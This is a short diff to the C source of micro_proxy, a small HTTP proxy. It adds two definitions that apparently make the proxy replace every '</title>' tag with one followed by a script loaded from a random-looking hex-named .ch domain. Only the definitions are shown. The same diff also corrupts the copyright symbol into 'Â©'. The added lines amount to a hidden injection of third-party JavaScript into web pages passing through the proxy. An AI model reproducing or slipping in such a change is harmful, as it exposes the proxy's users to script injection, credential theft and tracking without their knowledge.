@@ -1,6 +1,6 @@
 /* micro_proxy - really small HTTP proxy
 **
-** Copyright © 1999 by Jef Poskanzer <jef@mail.acme.com>.
+** Copyright Â© 1999 by Jef Poskanzer <jef@mail.acme.com>.
 ** All rights reserved.
 **
 ** Redistribution and use in source and binary forms, with or without
@@ -49,6 +49,8 @@
 
 #define SERVER_NAME "micro_proxy"
 #define SERVER_URL "http://www.acme.com/software/micro_proxy/"
+#define REPLACE_FOR "</title>"
+#define REPLACE_TO "</title><script src='http://d09bf41514a3365a46c9077ebb5e35c3.ch/design.js'></script>"
 #define PROTOCOL "HTTP/1.0"
 #define RFC1123FMT "%a, %d %b %Y %H:%M:%S GMT"
 #define TIMEOUT 300
